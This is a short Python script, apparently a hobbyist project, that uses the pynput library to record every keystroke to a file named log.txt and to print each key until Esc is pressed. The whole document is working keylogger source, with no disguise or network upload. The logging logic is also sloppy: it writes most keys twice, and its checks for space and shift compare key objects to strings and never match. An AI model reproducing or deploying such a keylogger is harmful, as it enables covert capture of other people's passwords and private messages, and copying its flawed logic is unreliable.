import pynput
from pynput.keyboard import Key, Listener

keys  = []
def KEY_press(key):
    keys.append(key)
    file_write(keys)
    try :
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed '.format(key))


def file_write(keys):
    special_characters = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '{', '}', '[', ']', ':',
                          ';', '"', "'", '<', '>', ',', '.', '?', '/']

    with open('log.txt', 'w') as file:
        for key in keys:
            k = str(key).replace("'", "")
            file.write(k)
            if key == 'Key.space' or key == 'Key.shift':
                file.write(' ')
            elif k in special_characters:
                file.write(k + '\n')
            else:
                file.write(k)


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False
        #stop the listerner
with Listener(on_press= KEY_press,
              on_release=on_release) as listener:
    listener.join()

